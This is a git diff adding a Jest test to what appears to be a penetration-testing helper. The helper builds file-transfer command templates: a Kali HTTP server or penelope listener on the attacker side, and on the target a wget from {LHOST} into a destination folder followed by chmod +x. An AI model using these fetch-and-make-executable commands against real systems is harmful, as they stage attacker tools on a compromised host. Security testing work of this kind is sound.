@@ -25,6 +25,14 @@ describe('transferMethods', () => {
     for (const m of linHttp) expect(m.kali.map((c) => c.template)).toEqual(['cd ~/tools/linux && python3 -m http.server 80', 'penelope -s . -p 80']);
   });
 
+  it('chmod is a trailing step of every Linux HTTP fetch, not a tab of its own', () => {
+    const http = lin().filter((m) => m.group === 'HTTP (default)');
+    expect(http.map((m) => m.label)).not.toContain('Make the file executable');
+    const wget = http.find((m) => m.label === 'wget')!;
+    expect(wget.target.map((c) => c.template)).toEqual(['wget http://{LHOST}/{FILE} -O {DEST_DIR}/{FILE}', 'chmod +x {DEST_DIR}/{FILE}']);
+    for (const m of http) expect(m.target.at(-1)!.template).toBe('chmod +x {DEST_DIR}/{FILE}');
+  });
+
   it('SMB group is one method with share, net use and copy in order', () => {
     const smb = win().filter((m) => m.group === 'SMB share on Kali');
     expect(smb).toHaveLength(1);
